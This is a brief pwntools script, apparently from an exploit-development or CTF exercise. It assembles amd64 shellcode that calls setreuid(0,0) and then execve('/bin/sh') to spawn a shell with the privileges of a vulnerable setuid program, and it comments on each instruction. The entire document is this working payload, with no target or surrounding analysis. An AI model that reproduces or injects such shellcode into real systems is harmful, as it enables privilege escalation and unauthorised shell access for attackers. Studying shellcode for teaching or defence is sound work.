from pwn import *

# Shellcode for setreuid(0,0) + execve("/bin/sh",0,0)
context.arch = "amd64"
shellcode = """
xor rax, rax
push rax
push rax
push rax
pop rdi
pop rsi
pop rdx
mov al, 0x71
syscall
mov rcx, 0x68732f6e69622f41             
shr rcx, 0x8                            
push rcx
push rsp
pop rdi
mov al, 0x3b                            
syscall
"""
# line 6 to 12: To make rax,rsi,rdi and rdx null.
# line 13: Moving the syscall number of setreuid() into rax.
# line 15: moving "A/bin/sh" into rcx.
# line 16: shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00".
# line 17 to 19: Moving the pointer which points to "/bin/sh\x00" into rdi.
# line 20 : Moving the syscall number of execve() into rax.

shellcode = asm(shellcode)
log.info(f"bytes of the shellcode: {shellcode}")            
log.info(f"lenght of the shellcode: {len(shellcode)}")        # 34 bytes shellcode
